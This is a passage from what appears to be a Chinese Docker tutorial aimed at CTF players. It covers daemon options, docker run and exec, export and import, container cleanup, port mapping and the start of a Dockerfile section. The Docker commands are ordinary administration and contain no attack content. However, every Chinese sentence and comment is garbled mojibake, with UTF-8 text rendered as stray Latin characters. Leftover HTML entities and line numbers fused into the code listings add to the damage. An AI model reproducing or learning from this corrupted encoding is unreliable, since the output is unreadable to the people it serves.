daemon mode # daemon æ¨¡å¼ -D, --debug=false Enable debug mode # debug æ¨¡å¼ --dns=[] Force docker to use specific DNS servers # å¼ºåˆ¶ docker ä½¿ç”¨æŒ‡å®š dns æœåŠ¡å™¨ --dns-search=[] Force Docker to use specific DNS search domains # å¼ºåˆ¶ docker ä½¿ç”¨æŒ‡å®š dns æœç´¢åŸŸ -e, --exec-driver="native" Force the docker runtime to use a specific exec driver # å¼ºåˆ¶ docker è¿è¡Œæ—¶ä½¿ç”¨æŒ‡å®šæ‰§è¡Œé©±åŠ¨å™¨ --fixed-cidr="" IPv4 subnet for fixed IPs (ex: 10.20.0.0/16) this subnet must be nested in the bridge subnet (which is defined by -b or --bip) -G, --group="docker" Group to assign the unix socket specified by -H when running in daemon mode use '' (the empty string) to disable setting of a group -g, --graph="/var/lib/docker" Path to use as the root of the docker runtime # å®¹å™¨è¿è¡Œçš„æ ¹ç›®å½•è·¯å¾„ -H, --host=[] The socket(s) to bind to in daemon mode # daemon æ¨¡å¼ä¸‹ docker æŒ‡å®šç»‘å®šæ–¹å¼[tcp or æœ¬åœ° socket] specified using one or more tcp://host:port, unix:///path/to/socket, fd://* or fd://socketfd. --icc=true Enable inter-container communication # è·¨å®¹å™¨é€šä¿¡ --insecure-registry=[] Enable insecure communication with specified registries (no certificate verification for HTTPS and enable HTTP fallback) (e.g., localhost:5000 or 10.20.0.0/16) --ip="0.0.0.0" Default IP address to use when binding container ports # æŒ‡å®šç›‘å¬åœ°å€ï¼Œé»˜è®¤æ‰€æœ‰ ip --ip-forward=true Enable net.ipv4.ip_forward # å¼€å¯è½¬å‘ --ip-masq=true Enable IP masquerading for bridge's IP range --iptables=true Enable Docker's addition of iptables rules # æ·»åŠ å¯¹åº” iptables è§„åˆ™ --mtu=0 Set the containers network MTU # è®¾ç½®ç½‘ç»œ mtu if no value is provided: default to the default route MTU or 1500 if no default route is available -p, --pidfile="/var/run/docker.pid" Path to use for daemon PID file # æŒ‡å®š pid æ–‡ä»¶ä½ç½® --registry-mirror=[] Specify a preferred Docker registry mirror -s, --storage-driver="" Force the docker runtime to use a specific storage driver # å¼ºåˆ¶ docker è¿è¡Œæ—¶ä½¿ç”¨æŒ‡å®šå­˜å‚¨é©±åŠ¨ --selinux-enabled=false Enable selinux support # å¼€å¯ selinux æ”¯æŒ --storage-opt=[] Set storage driver options # è®¾ç½®å­˜å‚¨é©±åŠ¨é€‰é¡¹ --tls=false Use TLS; implied by tls-verify flags # å¼€å¯ tls --tlscacert="/root/.docker/ca.pem" Trust only remotes providing a certificate signed by the CA given here --tlscert="/root/.docker/cert.pem" Path to TLS certificate file # tls è¯ä¹¦æ–‡ä»¶ä½ç½® --tlskey="/root/.docker/key.pem" Path to TLS key file # tls key æ–‡ä»¶ä½ç½® --tlsverify=false Use TLS and verify the remote (daemon: verify client, client: verify daemon) # ä½¿ç”¨ tls å¹¶ç¡®è®¤è¿œç¨‹æŽ§åˆ¶ä¸»æœº -v, --version=false Print version information and quit # è¾“å‡º docker ç‰ˆæœ¬ä¿¡æ¯ Docker æä¾›äº†ä¸€å¥—ç®€å•å®žç”¨çš„å‘½ä»¤æ¥åˆ›å»ºå’Œæ›´æ–°é•œåƒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç½‘ç»œç›´æŽ¥ä¸‹è½½ä¸€ä¸ªå·²ç»åˆ›å»ºå¥½äº†çš„åº”ç”¨é•œåƒï¼Œå¹¶é€šè¿‡ Docker RUN å‘½ä»¤å°±å¯ä»¥ç›´æŽ¥ä½¿ç”¨ã€‚å½“é•œåƒé€šè¿‡ RUN å‘½ä»¤è¿è¡ŒæˆåŠŸåŽï¼Œè¿™ä¸ªè¿è¡Œçš„é•œåƒå°±æ˜¯ä¸€ä¸ª Docker å®¹å™¨å•¦ï¼Œå®¹å™¨å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªè½»é‡çº§çš„æ²™ç®±ï¼Œ Docker åˆ©ç”¨å®¹å™¨æ¥è¿è¡Œå’Œéš”ç¦»åº”ç”¨ï¼Œå®¹å™¨æ˜¯å¯ä»¥è¢«å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤çš„ï¼Œè¿™å¹¶ä¸ä¼šå½±å“ Docker é•œåƒã€‚ æˆ‘ä»¬å¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™å¹…å›¾ï¼š æ“ä½œå®¹å™¨å¯åŠ¨å®¹å™¨ å¯åŠ¨å®¹å™¨æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäºŽé•œåƒæ–°å»ºä¸€ä¸ªå®¹å™¨å¹¶å¯åŠ¨ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯å°†åœ¨ç»ˆæ­¢çŠ¶æ€ï¼ˆstoppedï¼‰çš„å®¹å™¨é‡æ–°å¯åŠ¨ã€‚ å› ä¸º Docker çš„å®¹å™¨å®žåœ¨å¤ªè½»é‡çº§äº†ï¼Œå¾ˆå¤šæ—¶å€™ç”¨æˆ·éƒ½æ˜¯éšæ—¶åˆ é™¤å’Œæ–°åˆ›å»ºå®¹å™¨ã€‚ æ–°å»ºå¹¶å¯åŠ¨ æ‰€éœ€è¦çš„å‘½ä»¤ä¸»è¦ä¸º docker runã€‚ docker build -t æ˜¯åˆ©ç”¨Dockerfile æž„å»ºé•œåƒï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨ â€“name æ¥ç»™è‡ªå·±çš„é•œåƒå‘½å;docker run æ˜¯åˆ©ç”¨ä¾æ®è¿™ä¸ªé•œåƒæž„å»ºå®¹å™¨ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨ â€“name å‘½åä½ çš„å®¹å™¨;å¦‚æžœå®¹å™¨éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©æŒ‚è½½/æŒ‚è½½æ•°æ®å·çš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥ç›´æŽ¥COPY/ADDæ¥è¦†ç›– ä¾‹å¦‚ï¼Œä¸‹é¢çš„å‘½ä»¤è¾“å‡ºä¸€ä¸ª â€œHello Worldâ€ï¼Œä¹‹åŽç»ˆæ­¢å®¹å™¨ã€‚ 12$ docker run --name wubantu ubuntu:18.04 /bin/echo 'Hello world'Hello world è¿™è·Ÿåœ¨æœ¬åœ°ç›´æŽ¥æ‰§è¡Œ /bin/echo &#39;hello world&#39; å‡ ä¹Žæ„Ÿè§‰ä¸å‡ºä»»ä½•åŒºåˆ«ã€‚ ä¸‹é¢çš„å‘½ä»¤åˆ™å¯åŠ¨ä¸€ä¸ª bash ç»ˆç«¯ï¼Œå…è®¸ç”¨æˆ·è¿›è¡Œäº¤äº’ã€‚ 12$ docker run -t -i ubuntu:18.04 /bin/bashroot@af8bae53bdd3:/# å…¶ä¸­ï¼Œ-t é€‰é¡¹è®©Dockeråˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ï¼ˆpseudo-ttyï¼‰å¹¶ç»‘å®šåˆ°å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¸Šï¼Œ -i åˆ™è®©å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¿æŒæ‰“å¼€ã€‚ åœ¨äº¤äº’æ¨¡å¼ä¸‹ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æ‰€åˆ›å»ºçš„ç»ˆç«¯æ¥è¾“å…¥å‘½ä»¤ï¼Œä¾‹å¦‚ 1234root@af8bae53bdd3:/# pwd/root@af8bae53bdd3:/# lsbin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var å½“åˆ©ç”¨ docker run æ¥åˆ›å»ºå®¹å™¨æ—¶ï¼ŒDocker åœ¨åŽå°è¿è¡Œçš„æ ‡å‡†æ“ä½œåŒ…æ‹¬ï¼š æ£€æŸ¥æœ¬åœ°æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é•œåƒï¼Œä¸å­˜åœ¨å°±ä»Žå…¬æœ‰ä»“åº“ä¸‹è½½ åˆ©ç”¨é•œåƒåˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªå®¹å™¨ åˆ†é…ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨åªè¯»çš„é•œåƒå±‚å¤–é¢æŒ‚è½½ä¸€å±‚å¯è¯»å†™å±‚ ä»Žå®¿ä¸»ä¸»æœºé…ç½®çš„ç½‘æ¡¥æŽ¥å£ä¸­æ¡¥æŽ¥ä¸€ä¸ªè™šæ‹ŸæŽ¥å£åˆ°å®¹å™¨ä¸­åŽ» ä»Žåœ°å€æ± é…ç½®ä¸€ä¸ª ip åœ°å€ç»™å®¹å™¨ æ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„åº”ç”¨ç¨‹åº æ‰§è¡Œå®Œæ¯•åŽå®¹å™¨è¢«ç»ˆæ­¢ å¯åŠ¨å·²ç»ˆæ­¢å®¹å™¨ å¯ä»¥åˆ©ç”¨ docker container start å‘½ä»¤ï¼Œç›´æŽ¥å°†ä¸€ä¸ªå·²ç»ç»ˆæ­¢çš„å®¹å™¨å¯åŠ¨è¿è¡Œã€‚ å®¹å™¨çš„æ ¸å¿ƒä¸ºæ‰€æ‰§è¡Œçš„åº”ç”¨ç¨‹åºï¼Œæ‰€éœ€è¦çš„èµ„æºéƒ½æ˜¯åº”ç”¨ç¨‹åºè¿è¡Œæ‰€å¿…éœ€çš„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå¹¶æ²¡æœ‰å…¶å®ƒçš„èµ„æºã€‚å¯ä»¥åœ¨ä¼ªç»ˆç«¯ä¸­åˆ©ç”¨ ps æˆ– top æ¥æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ã€‚ 1234root@ba267838cc1b:/# ps PID TTY TIME CMD 1 ? 00:00:00 bash 11 ? 00:00:00 ps åŽå°è¿è¡Œ æ›´å¤šçš„æ—¶å€™ï¼Œéœ€è¦è®© Docker åœ¨åŽå°è¿è¡Œè€Œä¸æ˜¯ç›´æŽ¥æŠŠæ‰§è¡Œå‘½ä»¤çš„ç»“æžœè¾“å‡ºåœ¨å½“å‰å®¿ä¸»æœºä¸‹ã€‚æ­¤æ—¶ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ  -d å‚æ•°æ¥å®žçŽ°ã€‚ ä¸‹é¢ä¸¾ä¸¤ä¸ªä¾‹å­æ¥è¯´æ˜Žä¸€ä¸‹ã€‚ å¦‚æžœä¸ä½¿ç”¨ -d å‚æ•°è¿è¡Œå®¹å™¨ã€‚ 12345$ docker run ubuntu:18.04 /bin/sh -c "while true; do echo hello world; sleep 1; done"hello worldhello worldhello worldhello world å®¹å™¨ä¼šæŠŠè¾“å‡ºçš„ç»“æžœ (STDOUT) æ‰“å°åˆ°å®¿ä¸»æœºä¸Šé¢ å¦‚æžœä½¿ç”¨äº† -d å‚æ•°è¿è¡Œå®¹å™¨ã€‚ 12$ docker run -d ubuntu:18.04 /bin/sh -c "while true; do echo hello world; sleep 1; done"77b2dc01fe0f3f1265df143181e7b9af5e05279a884f4776ee75350ea9d8017a æ­¤æ—¶å®¹å™¨ä¼šåœ¨åŽå°è¿è¡Œå¹¶ä¸ä¼šæŠŠè¾“å‡ºçš„ç»“æžœ (STDOUT) æ‰“å°åˆ°å®¿ä¸»æœºä¸Šé¢(è¾“å‡ºç»“æžœå¯ä»¥ç”¨ docker logs æŸ¥çœ‹)ã€‚ æ³¨ï¼š å®¹å™¨æ˜¯å¦ä¼šé•¿ä¹…è¿è¡Œï¼Œæ˜¯å’Œ docker run æŒ‡å®šçš„å‘½ä»¤æœ‰å…³ï¼Œå’Œ -d å‚æ•°æ— å…³ã€‚ ä½¿ç”¨ -d å‚æ•°å¯åŠ¨åŽä¼šè¿”å›žä¸€ä¸ªå”¯ä¸€çš„ idï¼Œä¹Ÿå¯ä»¥é€šè¿‡ docker container ls å‘½ä»¤æ¥æŸ¥çœ‹å®¹å™¨ä¿¡æ¯ã€‚ 123$ docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES77b2dc01fe0f ubuntu:18.04 /bin/sh -c 'while tr 2 minutes ago Up 1 minute agitated_wright è¦èŽ·å–å®¹å™¨çš„è¾“å‡ºä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ docker container logs å‘½ä»¤ã€‚ 12345$ docker container logs [container ID or NAMES]hello worldhello worldhello world. . . ç»ˆæ­¢å®¹å™¨ å¯ä»¥ä½¿ç”¨ docker container stop æ¥ç»ˆæ­¢ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ã€‚ æ­¤å¤–ï¼Œå½“ Docker å®¹å™¨ä¸­æŒ‡å®šçš„åº”ç”¨ç»ˆç»“æ—¶ï¼Œå®¹å™¨ä¹Ÿè‡ªåŠ¨ç»ˆæ­¢ã€‚ ç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨å¯ä»¥ç”¨ docker container ls -a å‘½ä»¤çœ‹åˆ°ã€‚ä¾‹å¦‚ 1234docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESba267838cc1b ubuntu:18.04 "/bin/bash" 30 minutes ago Exited (0) About a minute ago trusting_newton98e5efa7d997 training/webapp:latest "python app.py" About an hour ago Exited (0) 34 minutes ago backstabbing_pike å¤„äºŽç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œå¯ä»¥é€šè¿‡ docker container start å‘½ä»¤æ¥é‡æ–°å¯åŠ¨ã€‚ æ­¤å¤–ï¼Œdocker container restart å‘½ä»¤ä¼šå°†ä¸€ä¸ªè¿è¡Œæ€çš„å®¹å™¨ç»ˆæ­¢ï¼Œç„¶åŽå†é‡æ–°å¯åŠ¨å®ƒã€‚ å¥½åƒä¹Ÿå¯ä»¥ç›´æŽ¥docker start/stop/restart ID æ–‡ä»¶åŒå‘ä¼ è¾“ å¦‚æžœæ˜¯å®¹å™¨ä¼ è¾“æ–‡ä»¶åˆ°æœ¬åœ°çš„è¯ï¼Œåè¿‡æ¥å°±å¥½äº†ï¼š1docker cp IDå…¨ç§°:å®¹å™¨æ–‡ä»¶è·¯å¾„ æœ¬åœ°è·¯å¾„ å¥½ç”¨çš„å‘½ä»¤ åœæ­¢å¹¶åˆ é™¤æ‰€æœ‰çš„å®¹å™¨ 1docker stop $(docker ps -q) &amp; docker rm $(docker ps -aq) åˆ é™¤æ‰€æœ‰çš„é•œåƒ 1docker rmi $(docker images -q) è¿›å…¥å®¹å™¨ åœ¨ä½¿ç”¨ -d å‚æ•°æ—¶ï¼Œå®¹å™¨å¯åŠ¨åŽä¼šè¿›å…¥åŽå°ã€‚ æŸäº›æ—¶å€™éœ€è¦è¿›å…¥å®¹å™¨è¿›è¡Œæ“ä½œï¼ŒåŒ…æ‹¬ä½¿ç”¨ docker attach å‘½ä»¤æˆ– docker exec å‘½ä»¤ï¼ŒæŽ¨èå¤§å®¶ä½¿ç”¨ docker exec å‘½ä»¤ï¼ŒåŽŸå› ä¼šåœ¨ä¸‹é¢è¯´æ˜Žã€‚ attach å‘½ä»¤ ä¸‹é¢ç¤ºä¾‹å¦‚ä½•ä½¿ç”¨ docker attach å‘½ä»¤ã€‚ 123456789$ docker run -dit ubuntu243c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550$ docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES243c32535da7 ubuntu:latest "/bin/bash" 18 seconds ago Up 17 seconds nostalgic_hypatia$ docker attach 243croot@243c32535da7:/# æ³¨æ„ï¼š å¦‚æžœä»Žè¿™ä¸ª stdin ä¸­ exitï¼Œä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚ exec å‘½ä»¤ docker exec åŽè¾¹å¯ä»¥è·Ÿå¤šä¸ªå‚æ•°ï¼Œè¿™é‡Œä¸»è¦è¯´æ˜Ž -i -t å‚æ•°ã€‚ åªç”¨ -i å‚æ•°æ—¶ï¼Œç”±äºŽæ²¡æœ‰åˆ†é…ä¼ªç»ˆç«¯ï¼Œç•Œé¢æ²¡æœ‰æˆ‘ä»¬ç†Ÿæ‚‰çš„ Linux å‘½ä»¤æç¤ºç¬¦ï¼Œä½†å‘½ä»¤æ‰§è¡Œç»“æžœä»ç„¶å¯ä»¥è¿”å›žã€‚ å½“ -i -t å‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œåˆ™å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç†Ÿæ‚‰çš„ Linux å‘½ä»¤æç¤ºç¬¦ã€‚ 12345678910111213141516$ docker run -dit ubuntu69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6$ docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES69d137adef7a ubuntu:latest "/bin/bash" 18 seconds ago Up 17 seconds zealous_swirles$ docker exec -i 69d1 bashlsbinbootdev...$ docker exec -it 69d1 bashroot@69d137adef7a:/# å¦‚æžœä»Žè¿™ä¸ª stdin ä¸­ exitï¼Œä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæŽ¨èå¤§å®¶ä½¿ç”¨ docker exec çš„åŽŸå› ã€‚ æ›´å¤šå‚æ•°è¯´æ˜Žè¯·ä½¿ç”¨ docker exec â€“help æŸ¥çœ‹ã€‚ å¯¼å‡ºå’Œå¯¼å…¥å®¹å™¨ å¦‚æžœè¦å¯¼å‡ºæœ¬åœ°æŸä¸ªå®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨ docker export å‘½ä»¤ã€‚ 1234$ docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7691a814370e ubuntu:18.04 "/bin/bash" 36 hours ago Exited (0) 21 hours ago test$ docker export 7691a814370e &gt; ubuntu.tar è¿™æ ·å°†å¯¼å‡ºå®¹å™¨å¿«ç…§åˆ°æœ¬åœ°æ–‡ä»¶ã€‚ å¯ä»¥ä½¿ç”¨ docker import ä»Žå®¹å™¨å¿«ç…§æ–‡ä»¶ä¸­å†å¯¼å…¥ä¸ºé•œåƒï¼Œä¾‹å¦‚ 1234$ cat ubuntu.tar | docker import - test/ubuntu:v1.0$ docker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEtest/ubuntu v1.0 9d37a6082e97 About a minute ago 171.3 MB æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®š URL æˆ–è€…æŸä¸ªç›®å½•æ¥å¯¼å…¥ï¼Œä¾‹å¦‚ 1$ docker import http://example.com/exampleimage.tgz example/imagerepo æ³¨ï¼šç”¨æˆ·æ—¢å¯ä»¥ä½¿ç”¨ docker load æ¥å¯¼å…¥é•œåƒå­˜å‚¨æ–‡ä»¶åˆ°æœ¬åœ°é•œåƒåº“ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ docker import æ¥å¯¼å…¥ä¸€ä¸ªå®¹å™¨å¿«ç…§åˆ°æœ¬åœ°é•œåƒåº“ã€‚è¿™ä¸¤è€…çš„åŒºåˆ«åœ¨äºŽå®¹å™¨å¿«ç…§æ–‡ä»¶å°†ä¸¢å¼ƒæ‰€æœ‰çš„åŽ†å²è®°å½•å’Œå…ƒæ•°æ®ä¿¡æ¯ï¼ˆå³ä»…ä¿å­˜å®¹å™¨å½“æ—¶çš„å¿«ç…§çŠ¶æ€ï¼‰ï¼Œè€Œé•œåƒå­˜å‚¨æ–‡ä»¶å°†ä¿å­˜å®Œæ•´è®°å½•ï¼Œä½“ç§¯ä¹Ÿè¦å¤§ã€‚æ­¤å¤–ï¼Œä»Žå®¹å™¨å¿«ç…§æ–‡ä»¶å¯¼å…¥æ—¶å¯ä»¥é‡æ–°æŒ‡å®šæ ‡ç­¾ç­‰å…ƒæ•°æ®ä¿¡æ¯ã€‚ åˆ é™¤å®¹å™¨ å¯ä»¥ä½¿ç”¨ docker container rm æ¥åˆ é™¤ä¸€ä¸ªå¤„äºŽç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚ä¾‹å¦‚ 12$ docker container rm trusting_newtontrusting_newton å¦‚æžœè¦åˆ é™¤ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ï¼Œå¯ä»¥æ·»åŠ  -f å‚æ•°ã€‚Docker ä¼šå‘é€ SIGKILL ä¿¡å·ç»™å®¹å™¨ã€‚ æ¸…ç†æ‰€æœ‰å¤„äºŽç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ ç”¨ docker container ls -a å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ‰€æœ‰å·²ç»åˆ›å»ºçš„åŒ…æ‹¬ç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œå¦‚æžœæ•°é‡å¤ªå¤šè¦ä¸€ä¸ªä¸ªåˆ é™¤å¯èƒ½ä¼šå¾ˆéº»çƒ¦ï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥æ¸…ç†æŽ‰æ‰€æœ‰å¤„äºŽç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚ 1$ docker container prune ä½¿ç”¨ç½‘ç»œå¤–éƒ¨è®¿é—®å®¹å™¨ å®¹å™¨ä¸­å¯ä»¥è¿è¡Œä¸€äº›ç½‘ç»œåº”ç”¨ï¼Œè¦è®©å¤–éƒ¨ä¹Ÿå¯ä»¥è®¿é—®è¿™äº›åº”ç”¨ï¼Œå¯ä»¥é€šè¿‡ -P æˆ– -p å‚æ•°æ¥æŒ‡å®šç«¯å£æ˜ å°„ã€‚ å½“ä½¿ç”¨ -P æ ‡è®°æ—¶ï¼ŒDocker ä¼šéšæœºæ˜ å°„ä¸€ä¸ª 49000~49900 çš„ç«¯å£åˆ°å†…éƒ¨å®¹å™¨å¼€æ”¾çš„ç½‘ç»œç«¯å£ã€‚ ä½¿ç”¨ docker container ls å¯ä»¥çœ‹åˆ°ï¼Œæœ¬åœ°ä¸»æœºçš„ 49155 è¢«æ˜ å°„åˆ°äº†å®¹å™¨çš„ 5000 ç«¯å£ã€‚æ­¤æ—¶è®¿é—®æœ¬æœºçš„ 49155 ç«¯å£å³å¯è®¿é—®å®¹å™¨å†… web åº”ç”¨æä¾›çš„ç•Œé¢ã€‚ 12345$ docker run -d -P training/webapp python app.py$ docker container ls -lCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESbc533791f3f5 training/webapp:latest python app.py 5 seconds ago Up 2 seconds 0.0.0.0:49155-&gt;5000/tcp nostalgic_morse åŒæ ·çš„ï¼Œå¯ä»¥é€šè¿‡ docker logs å‘½ä»¤æ¥æŸ¥çœ‹åº”ç”¨çš„ä¿¡æ¯ã€‚ 1234$ docker logs -f nostalgic_morse* Running on http://0.0.0.0:5000/10.0.2.2 - - [23/May/2014 20:16:31] "GET / HTTP/1.1" 200 -10.0.2.2 - - [23/May/2014 20:16:31] "GET /favicon.ico HTTP/1.1" 404 - -p åˆ™å¯ä»¥æŒ‡å®šè¦æ˜ å°„çš„ç«¯å£ï¼Œå¹¶ä¸”ï¼Œåœ¨ä¸€ä¸ªæŒ‡å®šç«¯å£ä¸Šåªå¯ä»¥ç»‘å®šä¸€ä¸ªå®¹å™¨ã€‚æ”¯æŒçš„æ ¼å¼æœ‰ ip:hostPort:containerPort | ip::containerPort | hostPort:containerPortã€‚ æ˜ å°„æ‰€æœ‰æŽ¥å£åœ°å€ ä½¿ç”¨ hostPort:containerPort æ ¼å¼æœ¬åœ°çš„ 5000 ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ 5000 ç«¯å£ï¼Œå¯ä»¥æ‰§è¡Œ 1$ docker run -d -p 5000:5000 training/webapp python app.py æ­¤æ—¶é»˜è®¤ä¼šç»‘å®šæœ¬åœ°æ‰€æœ‰æŽ¥å£ä¸Šçš„æ‰€æœ‰åœ°å€ã€‚ æ˜ å°„åˆ°æŒ‡å®šåœ°å€çš„æŒ‡å®šç«¯å£ å¯ä»¥ä½¿ç”¨ ip:hostPort:containerPort æ ¼å¼æŒ‡å®šæ˜ å°„ä½¿ç”¨ä¸€ä¸ªç‰¹å®šåœ°å€ï¼Œæ¯”å¦‚ localhost åœ°å€ 127.0.0.1 1$ docker run -d -p 127.0.0.1:5000:5000 training/webapp python app.py æ˜ å°„åˆ°æŒ‡å®šåœ°å€çš„ä»»æ„ç«¯å£ ä½¿ç”¨ ip::containerPort ç»‘å®š localhost çš„ä»»æ„ç«¯å£åˆ°å®¹å™¨çš„ 5000 ç«¯å£ï¼Œæœ¬åœ°ä¸»æœºä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªç«¯å£ã€‚ $ docker run -d -p 127.0.0.1::5000 training/webapp python app.py è¿˜å¯ä»¥ä½¿ç”¨ udp æ ‡è®°æ¥æŒ‡å®š udp ç«¯å£ 1$ docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py æŸ¥çœ‹æ˜ å°„ç«¯å£é…ç½® ä½¿ç”¨ docker port æ¥æŸ¥çœ‹å½“å‰æ˜ å°„çš„ç«¯å£é…ç½®ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹åˆ°ç»‘å®šçš„åœ°å€ 12$ docker port nostalgic_morse 5000127.0.0.1:49155. æ³¨æ„ï¼šå®¹å™¨æœ‰è‡ªå·±çš„å†…éƒ¨ç½‘ç»œå’Œ ip åœ°å€ï¼ˆä½¿ç”¨ docker inspect å¯ä»¥èŽ·å–æ‰€æœ‰çš„å˜é‡ï¼ŒDocker è¿˜å¯ä»¥æœ‰ä¸€ä¸ªå¯å˜çš„ç½‘ç»œé…ç½®ã€‚ï¼‰-p æ ‡è®°å¯ä»¥å¤šæ¬¡ä½¿ç”¨æ¥ç»‘å®šå¤šä¸ªç«¯å£ 12345$ docker run -d \ -p 5000:5000 \ -p 3000:80 \ training/webapp \ python app.py å¯ä»¥æŸ¥çœ‹å®¹å™¨çš„å…·ä½“IPåœ°å€ï¼Œå¦‚æžœè¾“å‡ºæ˜¯ç©ºçš„è¯´æ˜Žæ²¡æœ‰é…ç½®IPåœ°å€1docker inspect --format '&#123;&#123; .NetworkSettings.IPAddress &#125;&#125;' å®¹å™¨id DockerfileDockerfileæ¦‚å¿µå‰é¢æˆ‘ä»¬å·²ç»æåˆ°äº† Docker çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µã€‚ä»¥ CTF é€‰æ‰‹çš„è§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥åŽ»ä½¿ç”¨ Dockerfile å®šä¹‰é•œåƒï¼Œä¾èµ–é•œåƒæ¥è¿è¡Œå®¹å™¨ï¼Œå¯ä»¥åŽ»æ¨¡æ‹Ÿå‡ºä¸€ä¸ªçœŸå®žçš„æ¼æ´žåœºæ™¯ã€‚å› æ­¤æ¯«æ— ç–‘é—®çš„è¯´ï¼Œ Dockerfile æ˜¯é•œåƒå’Œå®¹å™¨çš„å…³é”®ï¼Œå¹¶ä¸” Dockerfile è¿˜å¯ä»¥å¾ˆè½»æ˜“çš„åŽ»å®šä¹‰é•œåƒå†…å®¹ï¼Œè¯´äº†è¿™ä¹ˆå¤šï¼Œé‚£ä¹ˆ Dockerfile åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿ Dockerfile æ˜¯è‡ªåŠ¨æž„å»º docker é•œåƒçš„é…ç½®æ–‡ä»¶ï¼Œ ç”¨æˆ·å¯ä»¥ä½¿ç”¨ Dockerfile å¿«é€Ÿåˆ›å»ºè‡ªå®šä¹‰çš„é•œåƒã€‚Dockerfile ä¸­çš„å‘½ä»¤éžå¸¸ç±»ä¼¼äºŽ linux ä¸‹çš„ shell å‘½ä»¤ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™å¹…å›¾æ¥ç›´è§‚åœ°æ„Ÿå—ä¸‹ Docker é•œåƒã€å®¹å™¨å’Œ Dockerfile ä¸‰è€…ä¹‹é—´çš„å…³ç³»ã€‚ æˆ‘ä»¬ä»Žä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ Dockerfile å¯ä»¥è‡ªå®šä¹‰é•œåƒï¼Œé€šè¿‡ Docker å‘½ä»¤åŽ»è¿è¡Œé•œåƒï¼Œä»Žè€Œè¾¾åˆ°å¯åŠ¨å®¹å™¨çš„ç›®çš„ã€‚ Dockerfile æ˜¯ç”±ä¸€è¡Œè¡Œå‘½ä»¤è¯­å¥ç»„æˆï¼Œå¹¶ä¸”æ”¯æŒå·² # å¼€å¤´çš„æ³¨é‡Šè¡Œã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°† Dockerfile åˆ†ä¸ºå››ä¸ªéƒ¨åˆ†ï¼š åŸºç¡€é•œåƒ(çˆ¶é•œåƒ)ä¿¡æ¯æŒ‡ä»¤ FROM ç»´æŠ¤è€…ä¿¡æ¯æŒ‡ä»¤ MAINTAINER é•œåƒæ“ä½œæŒ‡ä»¤ RUN ã€ EVN ã€ ADD å’Œ WORKDIR ç­‰ å®¹å™¨å¯åŠ¨æŒ‡ä»¤ CMD ã€ ENTRYPOINT å’Œ USER ç­‰ Dockerfileæ–‡ä»¶æ ¼å¼ä¸‹é¢æ˜¯ä¸€æ®µç®€å•çš„Dockerfileçš„ä¾‹å­ï¼š 12345678FROM python:2.7MAINTAINER QYMUA &lt;qymuao3o@gmail.com&gt;COPY . /appWORKDIR /appRUN pip install -r requirements.txtEXPOSE 5000ENTRYPOINT ["python"]CMD 